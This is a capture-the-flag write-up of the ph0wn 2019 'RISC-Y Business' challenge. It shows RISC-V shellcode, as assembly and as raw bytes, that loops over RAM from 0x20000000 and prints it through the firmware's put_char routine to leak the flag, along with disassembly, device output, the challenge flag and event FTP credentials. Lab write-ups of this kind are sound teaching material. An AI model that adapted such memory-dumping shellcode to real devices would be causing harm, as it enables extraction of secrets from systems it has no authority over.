---
layout: post
title: "ph0wn 2019 - RISC-Y Business"
mathjax: true

date: 2019-12-13

---

*Shellcode writing on RISC-V platform to dump the RAM were the flag lies.*

<!--more-->

### Description

Hey, hey, here we are! Did you ever put your hands on a board with a real RISC-V MCU? No? So, this challenge is for you.

The onboard MCU is a GD32VF103CBT6 manufactured by GigaDevice, a well (not)known Chinese factory. The goal of this chip is to invade the IOT market in replacement of the STM32F103CBT6: it is pin-to-pin compatible and the memory quantities, mapping are the SAME!

So, when you’ll check the security of this fancy IOT, will you be able to run code inside and get out all it secrets? We’ll see…

The goal of this challenge is to pw0n the board by writing a shellcode and to get out the “flag” from the RAM.

As we are kind enough at ph0wn, we give you the non-stripped .elf binary running inside the MCU, the SDK to generate code, and a few RISC-V docs to accelerate the job.

How the shellcode is called:

```c
uint8_t shellcode[50];       
...             
/* read 50 bytes in shellcode */               
...                 
(*(void(*)()) shellcode) ();

The flag is computed at boot time and is available here:

uint8_t flag[32]="ph0wn{xXxXxXxXxXxXxXxXxXxXxXxX}\0";
```

Refer to the 2 photos for connecting to the board and RESET. The USART setup is 115200 8N1.

PLEASE, PLEASE, PLEASE, do not open the case, the boards are fragile, 2 were broken during the development. 

Good luck!

Nota: you can download some documentation and toolchain from our FTP server on 10.210.17.34.

    id: ph0wn
    pwd: ph0wn2019

### Details

Points:     500

Category:   Pwn

Author:     [Phil](https://twitter.com/PagetPhil)

### Solution

The serial connection and reset button were indicated:
<img src="/resources/2019/ph0wn/riscy/Reset.jpg" width="800">
<img src="/resources/2019/ph0wn/riscy/Power_Serial.jpg" width="800">

Connecting the device to the serial and resetting it gave the following welcome screen:

```

                                           %                                   
                          %.            *                                      
                             @         #                                       
                               &                                               
                                .                                              
                         %((((         #(((%                                   
                       (((((((#      #(((((//                                  
                      (/(((((((      &(((((//(                                 
                      @%%((((((      ,((((((@@,                                
                      @@(((((((       #((((#/@                                 
                      %/(((((((((((((((((((%(                                  
                        ((((((((((((((((((((                                   
                        ((((((((((((((((((((((((((((((((((((((((((((((#        
                         ((% (((((((((((((((((((((((((((((((((((((((((         
                         (....   .(%%%#((((((((#(((((((((((#####(*. )          
                          ,...... ....                             ,           
                           (..... ...........    .....    .....  )             
                            %.................      ........... .              
                             (................................)                
                               &........................... %                  
                                 ,,......................)                     
                                  ...%,..............*)                        
                                       .........,                              
                                                                               
Send your shellcode, 50 bytes:
Shellcode received successfully!
Now, the big jump ...
GO
trap

Program has exited with code:0x38000002
```

The goal was to write a shellcode in RISC-V to extract the flag. Hopefully, the [firmware](/resources/2019/ph0wn/riscy/firmware.elf) was given and the architecture is supported by [radare2](https://rada.re/n/). We first found a call to the **put_char** function:

```nasm
0x08000f0a      13057004       li a0, 71
0x08000f0e      c522           jal sym.put_char   
0x08000f10      1305f004       li a0, 79
0x08000f14      e92a           jal sym.put_char  
```

This part of the code is printing the "GO" string. Thus the goal was to call the put_char function with the flag as a parameter. The flag string was stored at address 0x20000000

```terminal
[0x08000d4c]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00004000 0x20000000 31  32   .data   ascii ph0wn{xXxXxXxXxXxXxXxXxXxXxXxX}
```

Thanks to the given SDK we could assemble our code with the following command:
```terminal
toolchain-gd32v-v9.2.0-linux/bin/riscv-nuclei-elf-gcc -c shellcode.S -o shellcode
```

 During the CTF, we had problem with the relative jump and we extract the flag byte per byte. However later we correct our shellcode and we got the following code :

```nasm
_start:
    lui a3, 0x20000
    addi a3, a3, -1

loop:
    addi a3, a3, 1
    lbu a0, 0(a3)
    lui a1, 0x8001
    addi a1, a1, 238
    jalr ra, a1, 0
    j loop
```

Finally the complete shellcode was:

```python
b'\xb7\x06\x00 \x93\x86\xf6\xff\x93\x86\x16\x00\x03\xc5\x06\x00\xb7\x15\x00\x08\x93\x85\xe5\x0e\xe7\x80\x05\x00o\xf0\xdf\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

And giving it to the device prints the flag:

```terminal
b'                          %.            *                                      \r\n'
b'                             @         #                                       \r\n'
b'                               &                                               \r\n'
b'                                .                                              \r\n'
b'                         %((((         #(((%                                   \r\n'
b'                       (((((((#      #(((((//                                  \r\n'
b'                      (/(((((((      &(((((//(                                 \r\n'
b'                      @%%((((((      ,((((((@@,                                \r\n'
b'                      @@(((((((       #((((#/@                                 \r\n'
b'                      %/(((((((((((((((((((%(                                  \r\n'
b'                        ((((((((((((((((((((                                   \r\n'
b'                        ((((((((((((((((((((((((((((((((((((((((((((((#        \r\n'
b'                         ((% (((((((((((((((((((((((((((((((((((((((((         \r\n'
b'                         (....   .(%%%#((((((((#(((((((((((#####(*. )          \r\n'
b'                          ,...... ....                             ,           \r\n'
b'                           (..... ...........    .....    .....  )             \r\n'
b'                            %.................      ........... .              \r\n'
b'                             (................................)                \r\n'
b'                               &........................... %                  \r\n'
b'                                 ,,......................)                     \r\n'
b'                                  ...%,..............*)                        \r\n'
b'                                       .........,                              \r\n'
b'                                                                               \r\n'
b'Send your shellcode, 50 bytes:'
b'\n'
b'\rShellcode received successfully!\n'
b'\rNow, the big jump ...\n'
b'\r'
b'GO\r\n'
b'ph0wn{UVeJustWroteUr1stR5Code!}\x00\xc1\xb7\xa0\x1b\x98\x9c\xd4w\xf7\x16\x84\xa9g\xab\xde\x0e\xf3\xf9}\xe3\xcb)\x10T"\xd3\xb9\xfb\'\xcb\xda\xa3\x00
```

Thanks Phil for the great challenge !